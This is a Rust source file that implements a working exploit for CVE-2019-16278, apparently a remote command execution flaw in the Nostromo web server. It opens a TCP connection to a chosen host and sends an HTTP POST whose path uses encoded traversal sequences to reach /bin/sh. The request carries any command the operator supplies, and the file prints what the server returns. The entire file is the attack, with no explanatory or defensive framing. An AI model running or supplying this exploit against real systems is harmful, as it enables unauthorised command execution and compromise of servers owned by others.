
pub mod cve_2019_16278 {

    use std;
    use std::net::{TcpStream};
    use anyhow::Error;
    use std::io::prelude::*;

    pub fn run(host: &String, port: i32, command: &String) -> Result<(), Error> {

        let host_port_str = format!("{}:{}", host, port);
        let payload_str = format!("POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\nContent-Length: 1\r\n\r\necho\necho\n{} 2>&1", command);
        let payload_bytes = payload_str.as_bytes();

        println!("Connecting to {}", host_port_str);

        let send_result = match TcpStream::connect(host_port_str) {

            Ok(mut stream) => send_payload(&mut stream, &payload_bytes),
            Err(err) => Err(Error::from(err))
        };

        match send_result {
            
            Ok(result) => {
                println!("{}", result);
                Ok(())
            },
            Err(err) => {
                println!("Connection Failed: {}", err);
                Err(err)
            }
        }
    }

    fn send_payload(stream: &mut TcpStream, payload_bytes: &[u8]) -> Result<String, Error> {

        stream.write(payload_bytes)?;

        let mut buffer = String::new();

        stream.read_to_string(&mut buffer)?;

        Ok(buffer)
    }
}
